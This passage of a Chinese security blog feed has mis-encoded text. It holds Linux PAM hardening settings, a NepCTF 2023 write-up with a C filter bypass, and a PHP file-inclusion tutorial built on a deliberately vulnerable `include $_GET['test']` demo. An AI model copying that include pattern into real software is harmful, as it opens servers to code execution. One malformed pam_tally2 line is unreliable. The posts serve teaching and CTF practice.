æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰å°å†™å­—æ¯ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 lcredit=-1</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿ"><a href="#è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿ" class="headerlink" title="è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿ"></a>è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„æ•°å­—ä¸ªæ•°ï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„æ•°å­—çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰æ•°å­—ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªæ•°å­—ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 dcredit=-1</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿ"><a href="#è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿ" class="headerlink" title="è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿ"></a>è®¾ç½®å¯†ç ä¸­æœ€å°‘çš„å…¶ä»–å­—ç¬¦ï¼ˆç¬¦å·ï¼‰ä¸ªæ•°ï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºå¯†ç ä¸­è‡³å°‘éœ€è¦çš„ç‰¹æ®Šç¬¦å·çš„ä¸ªæ•°ã€‚è¿™äº›æ˜¯å¯†ç å¼ºåº¦å‚æ•°ï¼Œå¯ä»¥è®©å¯†ç æ›´å¥å£®ã€‚å½“ç”¨æˆ·è®¾ç½®æ–°å¯†ç æ—¶ï¼Œç³»ç»Ÿä¼šæ£€æŸ¥è¿™ä¸ªå‚æ•°ï¼Œå¦‚æœå¯†ç ä¸­æ²¡æœ‰ç‰¹æ®Šç¬¦å·ï¼Œä¼šæ”¶åˆ°è­¦å‘Šæç¤ºã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚æˆ‘è®¾ç½®ä¸º 1 ä¸ªå­—ç¬¦ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">password    requisite     pam_cracklib.so try_first_pass retry=3 minlen=12 ocredit=-1</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®è´¦å·é”å®šï¼Ÿ"><a href="#è®¾ç½®è´¦å·é”å®šï¼Ÿ" class="headerlink" title="è®¾ç½®è´¦å·é”å®šï¼Ÿ"></a>è®¾ç½®è´¦å·é”å®šï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°æ§åˆ¶ç”¨æˆ·è¿ç»­ç™»å½•å¤±è´¥çš„æœ€å¤§æ¬¡æ•°ã€‚å½“è¾¾åˆ°è®¾å®šçš„è¿ç»­å¤±è´¥ç™»å½•æ¬¡æ•°é˜ˆå€¼æ—¶ï¼Œé”å®šè´¦å·ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">auth        required      pam_tally2.so onerr=fail audit silent deny=5</span><br><span class="line">account required pam_tally2.so</span><br></pre></td></tr></table></figure><h4 id="è®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿ"><a href="#è®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿ" class="headerlink" title="è®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿ"></a>è®¾å®šè´¦å·è§£é”æ—¶é—´ï¼Ÿ</h4><p>è¿™ä¸ªå‚æ•°è¡¨ç¤ºç”¨æˆ·è§£é”æ—¶é—´ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·è´¦å·åœ¨è¿ç»­è®¤è¯å¤±è´¥åè¢«é”å®šäº†ï¼Œå½“è¿‡äº†è®¾å®šçš„è§£é”æ—¶é—´åï¼Œæ‰ä¼šè§£é”ã€‚è®¾ç½®è¢«é”å®šä¸­çš„è´¦å·çš„è§£é”æ—¶é—´ï¼ˆ900 ç§’ &#x3D; 15åˆ†é’Ÿï¼‰ã€‚è¿™ä¸ªå‚æ•°å¯ä»¥åœ¨ <code>/etc/pam.d/system-auth</code> æ–‡ä»¶ä¸­è®¾ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vi /etc/pam.d/system-auth</span></span><br><span class="line">auth        required      pam_tally2.so onerr=fail audit silent deny=5 unlock_time=900</span><br><span class="line">account required pam_tally2.so</span><br></pre></td></tr></table></figure><p>æ¥æº:<a href="https://linux.cn/">https://linux.cn/</a></p><h3 id="æ£€æŸ¥grubå¯†ç "><a href="#æ£€æŸ¥grubå¯†ç " class="headerlink" title="æ£€æŸ¥grubå¯†ç "></a>æ£€æŸ¥grubå¯†ç </h3><h2 id="å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡"><a href="#å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡" class="headerlink" title="å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡"></a>å¼±å£ä»¤é˜²èŒƒï¼Œæš´åŠ›ç ´è§£é˜²å¾¡</h2><ul><li><p>è®¾ç½®è¿ç»­è¾“é”™3æ¬¡å¯†ç ï¼Œè´¦å·é”å®š3åˆ†é’Ÿ(kali æ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶)</p><ul><li><p>æ–‡ä»¶ç¼–è¾‘</p><ul><li><code>/etc/pam.d/system-auth</code></li><li><code>/etc/pam.d/password-auth</code></li></ul></li><li><p>é…ç½®å†…å®¹ï¼Œåœ¨æºæ–‡ä»¶ç¬¬ä¸€è¡Œä¸‹é…ç½®å¦‚ä¸‹ä¸¤è¡Œ</p></li><li><p><code>auth required pam_tally2.so deny=3 unlock time=30 enven_deny_root root_unlock_time=30</code></p></li><li><p><code>account required pam_tally2.so</code></p></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º&quot;&gt;&lt;a href=&quot;#Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º&quot; class=&quot;headerlink&quot; title=&quot;Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º&quot;&gt;&lt;/a&gt;Linuxå®‰å…¨åŸºçº¿æ£€æŸ¥åŠåŠ å›º&lt;/h1&gt;&lt;h2 id=&quot;ç³»ç»ŸåŠ å›ºæ£€æŸ¥ç‚¹&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="åŸºçº¿æ£€æŸ¥" scheme="https://iahzl.github.io/categories/%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5/"/>
    
    <category term="Linux" scheme="https://iahzl.github.io/categories/%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5/Linux/"/>
    
    
    <category term="åŸºçº¿æ£€æŸ¥" scheme="https://iahzl.github.io/tags/%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5/"/>
    
    <category term="Linuxå®‰å…¨åŸºçº¿" scheme="https://iahzl.github.io/tags/Linux%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF/"/>
    
    <category term="å®‰å…¨åŸºçº¿åŠ å›º" scheme="https://iahzl.github.io/tags/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2023</title>
    <link href="https://iahzl.github.io/NepCTF-2023/"/>
    <id>https://iahzl.github.io/NepCTF-2023/</id>
    <published>2023-08-14T07:18:45.000Z</published>
    <updated>2023-10-26T10:55:02.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"><a href="#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼" class="headerlink" title="ä¸AIå…±èˆçš„å“ˆå¤«æ›¼"></a>ä¸AIå…±èˆçš„å“ˆå¤«æ›¼</h2><p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811230746325.png" alt="image-20230811230746325"></p><ol><li>ä¸‹è½½æ–‡ä»¶ æºç </li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">        self.char = char</span><br><span class="line">        self.freq = freq</span><br><span class="line">        self.left = <span class="literal">None</span></span><br><span class="line">        self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">    heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">    heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">        left = heapq.heappop(heap)</span><br><span class="line">        right = heapq.heappop(heap)</span><br><span class="line">        merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">        merged.left = left</span><br><span class="line">        merged.right = right</span><br><span class="line">        heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">    <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        huffman_codes[node.char] = current_code</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">    build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line"></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">            frequencies[byte] = <span class="number">0</span></span><br><span class="line">        frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line">    huffman_codes = &#123;&#125;</span><br><span class="line">    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">    compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">    padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">    compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="comment"># Write frequency information</span></span><br><span class="line">        f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">        <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Write compressed data</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">            byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">            f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    input_file = <span class="string">&#x27;input.txt&#x27;</span></span><br><span class="line">    compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">    decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">    compress(input_file, compressed_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£å‹ç¼©æ–‡ä»¶</span></span><br><span class="line">    decompress(compressed_file, decompressed_file)</span><br></pre></td></tr></table></figure><ol start="2"><li>è§‚å¯Ÿæºç å‘ç° ç¼ºå°‘è§£å‹ç¼©å‡½æ•° ç¼–å†™è§£å‹ç¼©å‡½æ•°</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    <span class="comment"># è¯»å–å‹ç¼©æ–‡ä»¶ä¸­çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        compressed_data = f.read()</span><br><span class="line">        <span class="comment"># print(compressed_data)</span></span><br><span class="line">    <span class="comment"># è¯»å–é¢‘ç‡ä¿¡æ¯</span></span><br><span class="line">    num_symbols = compressed_data[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(num_symbols)</span></span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(num_symbols):</span><br><span class="line">        symbol = compressed_data[index]</span><br><span class="line">        <span class="comment"># print(symbol)</span></span><br><span class="line">        freq = (compressed_data[index + <span class="number">1</span>] &lt;&lt; <span class="number">24</span>) | (compressed_data[index + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | (compressed_data[index + <span class="number">3</span>] &lt;&lt; <span class="number">8</span>) | compressed_data[index + <span class="number">4</span>]</span><br><span class="line">        frequencies[symbol] = freq</span><br><span class="line">        index += <span class="number">5</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># é‡å»º Huffman æ ‘</span></span><br><span class="line">    root = build_huffman_tree(frequencies)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è§£å‹ç¼©æ•°æ®</span></span><br><span class="line">    current_node = root</span><br><span class="line">    decompressed_data = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> compressed_data[index:]:</span><br><span class="line">        byte_value = <span class="built_in">int</span>(byte)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            bit = (byte_value &gt;&gt; i) &amp; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> bit == <span class="number">0</span>:</span><br><span class="line">                current_node = current_node.left</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                current_node = current_node.right</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> current_node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                decompressed_data.append(current_node.char)</span><br><span class="line">                current_node = root</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†è§£å‹ç¼©åçš„æ•°æ®å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">bytes</span>(decompressed_data))</span><br></pre></td></tr></table></figure><ol start="3"><li>è¿è¡Œä»£ç å¾—åˆ°<code>decompressed.txt</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811231022544.png" alt="image-20230811231022544"></p><h2 id="codes"><a href="#codes" class="headerlink" title="codes"></a>codes</h2><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145755134.png" alt="image-20230814145755134"></p><ol><li>è¿›å…¥è®¿é—®é¡µé¢åï¼š</li></ol><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145936294.png" alt="image-20230814145936294" style="zoom:67%;" /><ol start="2"><li><p>è§‚å¯Ÿå¾—åˆ° éœ€è¦è¾“å…¥Cè¯­è¨€ä»£ç ï¼Œè¾“å…¥systemåæ²¡æœ‰æ­£å¸¸æ˜¾ç¤ºï¼ŒçŒœæµ‹å¯èƒ½æ˜¯è¢«è¿‡æ»¤äº†</p></li><li><p>äºæ˜¯é€šè¿‡<code>argv</code> ç›´æ¥æ‰“å°å‘½ä»¤è¡Œå‚æ•°</p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="comment">// æ‰“å°å‘½ä»¤è¡Œå‚æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Command line arguments:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;argv[%d]: %s\n&quot;</span>, i, argv[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814150202144.png" alt="image-20230814150202144"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ä¸AIå…±èˆçš„å“ˆå¤«æ›¼&quot;&gt;&lt;a href=&quot;#ä¸AIå…±èˆçš„å“ˆå¤«æ›¼&quot; class=&quot;headerlink&quot; title=&quot;ä¸AIå…±èˆçš„å“ˆå¤«æ›¼&quot;&gt;&lt;/a&gt;ä¸AIå…±èˆçš„å“ˆå¤«æ›¼&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;http://cdn.jsdelivr.net/gh/iahzl</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="NepCTF 2023" scheme="https://iahzl.github.io/categories/CTF/NepCTF-2023/"/>
    
    
    <category term="ctf" scheme="https://iahzl.github.io/tags/ctf/"/>
    
    <category term="misc" scheme="https://iahzl.github.io/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶åŒ…å«</title>
    <link href="https://iahzl.github.io/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>https://iahzl.github.io/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2023-08-09T01:58:17.000Z</published>
    <updated>2023-08-09T08:28:40.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h1><h2 id="å«ä¹‰"><a href="#å«ä¹‰" class="headerlink" title="å«ä¹‰"></a>å«ä¹‰</h2><p>æœ¬è´¨æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚</p><ol><li>ä»¥PHPä¸ºä¾‹ï¼Œå¸¸ç”¨çš„æ–‡ä»¶åŒ…å«</li></ol><p><code>include(),require(),include_once(),require_once()</code></p><ol start="2"><li>åŒºåˆ«</li></ol><ul><li>*require():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½è­¦å‘Šï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ</li><li>*include():*æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­è¿è¡Œ</li><li>*require_once()ä¸require()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ</li><li>*include_once()ä¸include()ç±»ä¼¼:*å”¯ä¸€çš„åŒºåˆ«å°±æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œ</li></ul><ol start="3"><li>åˆ†æ</li></ol><p>ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>phpstudy</code>,åœ¨ç½‘ç«™æ ¹ç›®å½•åˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼š</p><p>é¦–å…ˆæ˜¯<code>include.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¥ç€æ˜¯<code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆåŠŸè§£æ</p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808143942662.png" alt="image-20230808143942662" style="zoom:80%;" /><p>å°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºtxtåè¿›è¡Œè®¿é—®ï¼Œä¾ç„¶å¯ä»¥è§£æ:</p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144634126.png" alt="image-20230808144634126" style="zoom:80%;" /><p>å°†phpinfo.phpæ–‡ä»¶åç¼€æ”¹ä¸ºjpgæ ¼å¼ï¼Œä¹Ÿå¯ä»¥è§£æ:</p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144725186.png" 